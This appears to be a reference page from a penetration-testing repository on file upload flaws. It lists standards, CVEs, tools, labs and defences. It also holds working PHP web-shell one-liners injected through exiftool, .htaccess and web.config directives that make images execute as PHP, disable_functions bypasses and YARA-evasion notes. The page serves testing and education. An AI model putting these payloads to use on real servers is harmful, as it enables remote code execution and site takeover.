# File Upload — Resources

## OWASP

- A03:2021 Injection (covers file content)
- A05:2021 Security Misconfiguration
- OWASP File Upload Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- OWASP Web Security Testing Guide — File Upload Testing
- OWASP ASVS V12 — File Handling

## CWE

- CWE-434 — Unrestricted Upload of File with Dangerous Type
- CWE-79 — XSS (SVG uploads)
- CWE-94 — Code Injection
- CWE-23 — Relative Path Traversal
- CWE-22 — Path Traversal
- CWE-732 — Incorrect Permission Assignment
- CWE-470 — Unsafe Reflection (file → class loader)

## Notable CVEs

- CVE-2024-53677 — Apache Struts2 file upload OGNL re-binding
- CVE-2023-36664 — GhostScript `%pipe%` + DCTDecode (`-dSAFER` bypass)
- CVE-2025-6218 — WinRAR RAR5 path traversal
- CVE-2017-12615 — Apache Tomcat JSP upload via PUT
- CVE-2019-19316 — phpMyAdmin file upload
- CVE-2021-21972 — VMware vCenter file upload
- CVE-2021-22005 — VMware vCenter file upload
- CVE-2022-1388 — F5 BIG-IP unauth upload
- CVE-2024-2961 — PHP filter chain RCE family

## Tools

### Burp extensions

- **Upload Scanner** — automated upload bypass testing
- **HTTP Request Smuggler**
- **Param Miner**
- **Active Scan++**

### Standalone

- **fuxploider** — auto upload bypass — https://github.com/almandin/fuxploider
- **wfuzz** — extension fuzzing
- **PHPGGC** — PHAR + PHP gadget chains
- **ysoserial** — Java serialization gadgets (for serialized uploads)
- **commix** — command injection (in upload metadata)
- **exiftool** — EXIF metadata polyglots
- **ImageMagick** — convert with embedded payload
- **GhostScript** — EPS payloads (CVE-2023-36664)

### Web shell collections

- **swisskyrepo/PayloadsAllTheThings** — Upload Insecure Files
- **WebShells** repository — https://github.com/JohnTroony/php-webshells
- **tennc/webshell** — multi-language shell collection
- **antsword** — web shell management
- **PHP Generic Gadget Chains (PHPGGC)** — phpggc

## Magic byte references

| File | Hex | ASCII |
|------|-----|-------|
| JPEG | FF D8 FF E0 | ÿØÿà |
| PNG | 89 50 4E 47 | .PNG |
| GIF | 47 49 46 38 | GIF8 |
| PDF | 25 50 44 46 | %PDF |
| ZIP | 50 4B 03 04 | PK.. |
| BMP | 42 4D | BM |
| WEBP | 52 49 46 46 ... 57 45 42 50 | RIFF...WEBP |
| MP4 | 66 74 79 70 | ftyp |

## Server-side language extensions

- **PHP**: .php .php3 .php4 .php5 .php7 .pht .phtml .phar .phpt .pgif .phtm .inc
- **ASP**: .asp .aspx .asa .cer .ashx .asmx .config
- **JSP**: .jsp .jspx .jsw .jsv .jspf
- **Other**: .pl .py .cgi .sh .rb .exe .dll .msi

## Apache .htaccess directives (for upload)

```apache
AddType application/x-httpd-php .l33t .shell .pwn .jpg .png .gif
AddHandler application/x-httpd-php .jpg
SetHandler application/x-httpd-php
<FilesMatch "\.jpg$"><SetHandler application/x-httpd-php></FilesMatch>
php_value auto_prepend_file /var/www/uploads/shell.jpg
```

## IIS web.config (for upload)

```xml
<add name="PHP_via_FastCGI" path="*.jpg" verb="*" modules="FastCgiModule"
     scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Unspecified" />
```

## ExifTool one-liners

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
exiftool -DocumentName='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
exiftool -Artist='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php
```

## YARA evasion

- HTA + VBScript stagers (mshta.exe path)
- LNK / SCR / MSI / MSC formats
- Obfuscated PowerShell stagers (Invoke-PowerShellTcp from Nishang)

## PHP `disable_functions` bypass functions

- `popen()` / `pcntl_exec()` / `error_log()` (type=1 + LD_PRELOAD)
- `mail()` + LD_PRELOAD on glibc
- `php://filter` chain (CVE-2024-2961 family)

## Practice / labs

- Web Security Academy — File Upload — https://portswigger.net/web-security/file-upload
- TryHackMe — File Upload room
- DVWA, OWASP Juice Shop, bWAPP

## Wordlists

- SecLists `Fuzzing/extensions.txt`
- SecLists `Fuzzing/file-upload-extensions/`
- SecLists `Web-Shells/PHP/`
- SecLists `Discovery/Web-Content/CommonBackdoors-PHP.fuzz.txt`

## Detection / monitoring

- AV scanner integration (ClamAV, sophos, kaspersky)
- YARA rule sets (Yara-Rules/rules)
- Mandiant flarestrings / FLOSS for malware-like uploads
- File integrity monitoring (Tripwire, AIDE)
- Web ACL / ModSecurity — Core Rule Set OWASP CRS

## Defensive references

- Always validate extension AND content (magic bytes AND file parser)
- Re-encode images server-side (strips EXIF)
- Store uploads outside webroot, serve via separate handler
- Random filenames (UUID), preserve extension only in DB
- Disable script execution on upload directory (`Options -ExecCGI`)
- AntiVirus scan before saving
- Quarantine + manual review for high-impact uploads (admin panels)

## Bug bounty programs (high upload-flaw yield)

- HackerOne — most CMS programs (WordPress, Drupal, Joomla)
- Bugcrowd — Tesla, Atlassian
- Vendor programs — Oracle, IBM, SAP

## Cheat-sheet companions in this repo

- `scenarios/file-upload/web-shell-payloads.md`
- `scenarios/file-upload/extension-bypass.md`
- `scenarios/file-upload/content-type-and-magic-bytes.md`
- `scenarios/file-upload/polyglot-and-metadata-injection.md`
- `scenarios/file-upload/path-traversal-and-htaccess.md`
- `scenarios/file-upload/race-conditions.md`
- `scenarios/file-upload/defense-evasion-and-yara.md`
